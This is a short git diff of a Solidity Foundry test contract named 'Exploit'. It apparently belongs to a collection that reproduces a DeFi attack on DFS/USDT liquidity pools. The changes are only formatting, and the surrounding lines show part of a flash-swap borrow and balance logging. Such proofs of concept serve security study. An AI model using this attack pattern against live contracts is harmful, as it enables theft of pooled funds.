@@ -50,7 +50,7 @@ contract Exploit is Test {
     function harvest() public {
         emit log_named_decimal_uint(
             "[INFO]  usdt balance : DFS_USDT_LP", IERC20(usdt).balanceOf(address(DFS_USDT_LP)), 18
-            );
+        );
         borrowamount = IERC20(usdt).balanceOf(address(DFS_USDT_LP));
         USDT_CCDS_LP.swap(borrowamount, 0, address(this), "0");
         emit log_named_decimal_uint("[INFO]  usdt balance : this", IERC20(usdt).balanceOf(address(this)), 18);
@@ -85,10 +85,10 @@ contract Exploit is Test {
 
         emit log_named_decimal_uint(
             "[INFO]  address(this) balance (dfs token)", IERC20(dfs).balanceOf(address(this)), 18
-            );
+        );
         emit log_named_decimal_uint(
             "[INFO]  address(this) balance (usdt token)", IERC20(usdt).balanceOf(address(this)), 18
-            );
+        );
 
         //todo
         uint256 dfslpusdtamount = IERC20(usdt).balanceOf(address(DFS_USDT_LP));
